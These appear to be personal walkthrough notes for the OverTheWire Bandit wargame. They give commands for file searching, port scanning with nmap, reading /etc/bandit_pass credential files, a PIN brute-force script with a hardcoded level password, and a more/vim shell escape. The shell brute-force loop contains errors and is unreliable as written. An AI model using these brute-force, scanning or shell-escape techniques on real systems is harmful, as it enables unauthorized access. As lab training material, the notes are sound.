# OverTheWire - Bandit

## Level 6 -> Level 7

```sh
# ignores permission denied errors
find / -type f -size 33c -user bandit7 -group bandit6 2>/dev/null
```

## Level 9 -> Level 10

```sh
# strings: filters human-readable strings in file
# grep: look for 2 or more consecutive '='
strings data.text | grep '=\{2,\}'
```

## Level 11 -> Level 12

```sh
# ROT13: rotates characters by 13 positions, a -> m, etc...
tr [n-zN-Za-mA-M] [a-mA-Mn-zN-Z] < data.txt
```

## Level 15 -> Level 16

```sh
# telnet does not allow connection using SSL
# use openssl s_client instead
openssl s_client -connect localhost:30001
```

## Level 16 -> Level 17

```sh
# minimal scan to find open ports
nmap localhost -p31000-32000
# service scan on found open ports
nmap localhost -sV --version-intensity 0 -pxxx,yyy,zzz
# once ssl speaking servers found, attempt to connect to them
openssl s_client -connect localhost:xxxx
```

## Level 18 -> Level 19

```sh
# run commands directly via ssh, rather than waiting for an interactive shell
ssh bandit.labs.overthewire.org -p 2220 -l bandit18 'cat readme'
ssh bandit.labs.overthewire.org -p 2220 -l bandit18 '/bin/bash --norc'
ssh bandit.labs.overthewire.org -p 2220 -l bandit18 '/bin/sh'
```

## Level 20 -> Level 21

```sh
# in one terminal, run nc and paste current password
nc -l -p 1234
# in another terminal (tmux or screen on the server, a new ssh connection from your machine)
./suconnect
```

## Level 24 -> Level 25

```sh
for pin in in {0000..9999}; do
  echo "$(cat /etc/bandit_pass/bandit24) $pin"
done | nc 30002
```

```python
import socket
import sys

HOST, PORT = "localhost", 30002
PASSWORD = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
ENCODING = "utf-8"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST, PORT))
    received = str(sock.recv(1024), ENCODING)
    print(received)

    for i in range(0, 9999):
        data = "{0} {1:04d}".format(PASSWORD, i)
        print(data)
        sock.sendall(bytes(data + "\n", ENCODING))
        received = str(sock.recv(1024), ENCODING)
        print(received)

        if "wrong" not in received.lower():
            break
```

## Level 25 -> Level 26

```sh
# find out what the shell for user 26 is
cat /etc/passwd | grep bandit26

# shell should be /usr/bin/show/text
# it does 'more /home/bandit26/text.txt'
# minize window to trigger more upon connection
# in more, press v to start vim
# in vim, run:
:set shell=/bin/bash
:shell

cat /etc/bandit_pass/bandit26
```

## Level 32 -> Level 33

The UPPERSHELL is a shell script. Typing a comment will show the positional paremeters.

```sh
./script.sh Hello World -> $0: ./script.sh $1:Hello $2:World

# To get a shell:
$0
```
